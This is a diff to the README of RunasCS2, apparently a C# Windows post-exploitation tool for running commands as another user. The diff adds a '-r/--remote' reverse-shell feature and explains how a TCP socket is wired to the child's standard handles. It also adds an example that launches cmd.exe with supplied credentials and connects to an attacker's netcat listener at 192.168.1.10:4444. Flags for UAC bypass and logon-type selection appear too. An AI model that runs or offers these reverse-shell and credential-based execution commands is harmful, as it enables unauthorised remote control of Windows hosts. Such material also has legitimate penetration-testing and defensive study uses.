@@ -1,10 +1,10 @@
 # RunasCS2
 
-A minimal C# alternative to [RunasCs](https://github.com/antonioCoco/RunasCs) that fixes three behavioural issues found in the original.
+A minimal C# alternative to [RunasCs](https://github.com/antonioCoco/RunasCs) that fixes several behavioural issues found in the original.
 
 ## Background
 
-RunasCs is a widely used Windows post-exploitation tool that runs commands as a different user via the `CreateProcessWithLogonW` Win32 API. During testing, three issues were identified in the original implementation that this project addresses.
+RunasCs is a widely used Windows post-exploitation tool that runs commands as a different user via the `CreateProcessWithLogonW` Win32 API. During testing, several issues were identified in the original implementation that this project addresses.
 
 ## Fixes
 
@@ -55,8 +55,16 @@ arrives as `"cmd.exe /c echo "AAA BBB""`, and `args[2]` becomes `cmd.exe /c echo
 > **Caveats**
 >
 > - The PowerShell 5.1 form is detected heuristically: the command is treated as PS 5.1-style when it starts and ends with `"` and the second unescaped `"` is immediately followed by a non-whitespace character. Unusual quoting may be misclassified.
-> - Options (`--domain`, `--logon-type`, `--bypass-uac`) are recognised only as a trailing sequence after the command. Strings like `--domain` inside the command itself are left untouched.
+> - Options (`--domain`, `--logon-type`, `--bypass-uac`, `-r`) are recognised only as a trailing sequence after the command. Strings like `--domain` inside the command itself are left untouched.
 > - If quoting does not come out as expected, prefer an unambiguous form: run from `cmd.exe` with `\"` escapes, use PowerShell 7.3+, or pass the line verbatim with PowerShell's stop-parsing token (`--%`).
+
+### Fix 6 – `-r` / `--remote` reverse shell
+
+**Original behaviour**: RunasCs supports `-r <host:port>` to redirect the child process's stdin/stdout/stderr to a TCP socket and return immediately without waiting for the process to exit. RunasCS2 previously lacked this.
+
+**RunasCS2**: `WSAStartup` + `WSASocketW` (non-overlapped, `dwFlags=0`) + `connect` opens a TCP connection to `<host:port>`. The socket handle is set as stdin/stdout/stderr in `STARTUPINFO`, the child process is started, and the tool exits immediately — the child keeps the socket alive.
+
+> **Note**: the socket must be non-overlapped (`dwFlags=0` in `WSASocketW`) to be usable as a `STARTUPINFO` standard handle.
 
 ## Build
 
@@ -79,6 +87,7 @@ RunasCS2.exe <username> <password> <command>
              [--domain <domain>]
              [--logon-type <2|3|8|9>]
              [--bypass-uac]
+             [-r|--remote <host:port>]
 ```
 
 | Flag | Description |
@@ -89,6 +98,7 @@ RunasCS2.exe <username> <password> <command>
 | `--logon-type 8` | NetworkCleartext – `LogonUser` + `CreateProcessAsUser` |
 | `--logon-type 9` | NewCredentials – `CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY)` |
 | `--bypass-uac` | `LogonUser` + `DuplicateTokenEx` + `CreateProcessWithTokenW` |
+| `-r`, `--remote <host:port>` | Redirect stdin/stdout/stderr to a TCP socket; exits immediately (no wait) |
 
 Default (no flags): `CreateProcessWithLogonW(LOGON_WITH_PROFILE)`.
 
@@ -109,6 +119,9 @@ Default (no flags): `CreateProcessWithLogonW(LOGON_WITH_PROFILE)`.
 
 # Domain user
 .\RunasCS2.exe alice P@ssw0rd "cmd /c whoami" --domain CORP
+
+# Reverse shell (nc -lvnp 4444 on attacker)
+.\RunasCS2.exe alice P@ssw0rd "cmd.exe" -r 192.168.1.10:4444
 ```
 
 ## Comparison with RunasCs
@@ -120,10 +133,10 @@ Default (no flags): `CreateProcessWithLogonW(LOGON_WITH_PROFILE)`.
 | Exact logon type (2/3/8) | Always Interactive internally | `LogonUser` with exact type |
 | `--bypass-uac` | Token manipulation via seclogon | `CreateProcessWithTokenW` |
 | Privilege checks / suggestions | Yes (rich warnings) | Minimal |
-| Remote impersonation | Yes | No |
+| `-r` / `--remote` reverse shell | Yes | Yes |
 | Process function selection | Yes (`--function`) | No |
 
-RunasCS2 is intentionally minimal. For the full feature set (remote impersonation, process function selection, privilege diagnostics) use the original RunasCs.
+RunasCS2 is intentionally minimal. For the full feature set (process function selection, privilege diagnostics) use the original RunasCs.
 
 ## Notes on `dwLogonFlags` for `CreateProcessWithLogonW`
 
